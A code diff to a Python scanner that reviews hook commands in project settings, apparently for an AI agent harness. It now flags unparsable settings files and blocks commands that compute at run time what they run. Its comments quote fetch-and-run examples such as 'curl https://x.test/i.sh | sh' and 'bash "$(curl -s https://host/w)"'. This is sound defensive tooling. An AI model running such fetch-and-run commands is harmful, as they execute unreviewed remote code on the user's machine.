@@ -1501,6 +1501,7 @@ HOOK_CODES = {
     "H8": "registered, but its script is missing — python3 on a missing file exits 2, which the "
           "harness reads as *block*, so every matching call is refused",
     "H9": "a shell resolves this command and we cannot: what it runs was not reviewed",
+    "H10": "the settings file does not parse — nothing in it was reviewed, and silence is not a pass",
 }
 
 # What the harness expands and `shlex` does not. A token still carrying any of these after our own
@@ -1528,26 +1529,32 @@ HOOK_RULES: list[tuple[str, str, re.Pattern]] = [
 AUTO_ALLOW = re.compile(r'permissionDecision["\']?\s*[:=]\s*["\']allow["\']')
 
 
-def hook_entries(root: Path) -> list[tuple[str, str, str]]:
-    """[(file, event, command)] for every command hook the project registers."""
-    out = []
+def hook_entries(root: Path) -> tuple[list[tuple[str, str, str]], list[tuple[str, str]]]:
+    """([(file, event, command)], [(file, why)]) — every hook registered, and every file we could
+    not read. The second list exists because the first version swallowed a parse error and a
+    project whose settings do not parse reported no hooks and no findings."""
+    out: list[tuple[str, str, str]] = []
+    unreadable: list[tuple[str, str]] = []
     for rel in HOOK_FILES:
         p = root / rel
         if not p.exists():
             continue
         try:
             data = json.loads(p.read_text(encoding="utf-8", errors="replace")) or {}
-        except json.JSONDecodeError:
+        except (json.JSONDecodeError, OSError) as exc:
+            # Returning nothing here read as "no hooks, no findings". A file we cannot parse is a
+            # file we did not review, and the harness may well read it differently from us anyway.
+            unreadable.append((rel, str(exc).split("\n")[0][:110]))
             continue
         for event, groups in (data.get("hooks") or {}).items():
             for group in groups if isinstance(groups, list) else []:
                 for h in (group.get("hooks") or []) if isinstance(group, dict) else []:
                     if isinstance(h, dict) and h.get("command"):
                         out.append((rel, str(event), str(h["command"])))
-    return out
+    return out, unreadable
 
 
-def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[str]]:
+def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[tuple[str, bool]]]:
     """EVERY file a hook runs, not the first.
 
     The first version returned one, so `python3 good.py && python3 evil.py` was reviewed by reading
@@ -1562,9 +1569,12 @@ def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[str]]:
         tokens = shlex.split(expanded, posix=True) if expanded.strip() else []
     except ValueError:            # an unbalanced quote: fall back to whitespace, never to silence
         tokens = expanded.split()
+    # `$HOME/bin/tool.sh` is ordinary and a reader can judge it; a command that COMPUTES what it
+    # runs cannot be judged by anyone, so the pair carries which kind this is.
     if SUBSTITUTION.search(expanded):
-        return [], [command.strip()]
-    out, unresolved = [], []
+        return [], [(command.strip(), True)]
+    out: list[Path] = []
+    unresolved: list[tuple[str, bool]] = []
     for token in tokens:
         # `curl https://x.test/i.sh | sh` ends in `.sh` and is not a path. A URL is a URL.
         if "://" in token:
@@ -1574,7 +1584,7 @@ def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[str]]:
         if SHELL_SYNTAX.search(token):
             # `$HOME/x.py`, `ev*.py`, `$(echo ev)il.py`: the shell resolves these and we do not.
             # Computing a path from the literal text invents a file, then reports it missing.
-            unresolved.append(token)
+            unresolved.append((token, False))
             continue
         out.append(Path(token) if Path(token).is_absolute() else root / token)
     return out, unresolved
@@ -1582,7 +1592,10 @@ def hook_scripts(root: Path, command: str) -> tuple[list[Path], list[str]]:
 
 def review_hooks(root: Path) -> list[Finding]:
     found: list[Finding] = []
-    for rel, event, command in hook_entries(root):
+    entries, unreadable = hook_entries(root)
+    for rel, why in unreadable:
+        found.append(Finding("H10", "block", rel, HOOK_CODES["H10"], f"{rel}: {why}"))
+    for rel, event, command in entries:
         where = f"{rel} · {event}"
         seen: set[str] = set()
         for code, level, pat in HOOK_RULES:
@@ -1590,8 +1603,15 @@ def review_hooks(root: Path) -> list[Finding]:
                 seen.add(code)
                 found.append(Finding(code, level, event, HOOK_CODES[code], command[:150]))
         scripts, unresolved = hook_scripts(root, command)
-        for token in unresolved:
-            found.append(Finding("H9", "review", event, HOOK_CODES["H9"], f"{where}: {token}"))
+        for token, computed in unresolved:
+            # Making H9 uniformly `review` was a control regression: before it, an unresolvable
+            # command produced an invented path and an H8 *block* — for the wrong reason, but it
+            # blocked. `bash "$(curl -s https://host/w)"` then passed `check` with a tick, and no
+            # other rule catches it: H1 needs a pipe. A command that computes what it runs is the
+            # one shape nobody can review, so it blocks; an expansion a reader can follow does not.
+            found.append(Finding("H9", "block" if computed else "review", event,
+                                 HOOK_CODES["H9"] + (" — and it computes that at run time" if computed else ""),
+                                 f"{where}: {token}"))
         if not scripts:
             # An inline shell command, already judged by the rules above. H6 asks where a SCRIPT
             # lives; saying it of a command that has none is a finding with no action behind it.
@@ -1638,7 +1658,7 @@ def review_hooks(root: Path) -> list[Finding]:
 
 def cmd_hook_review(args) -> int:
     root = args.root.resolve()
-    entries = hook_entries(root)
+    entries, _ = hook_entries(root)
     findings = review_hooks(root)
     if args.json:
         print(json.dumps({"hooks": [{"file": f, "event": e, "command": c} for f, e, c in entries],
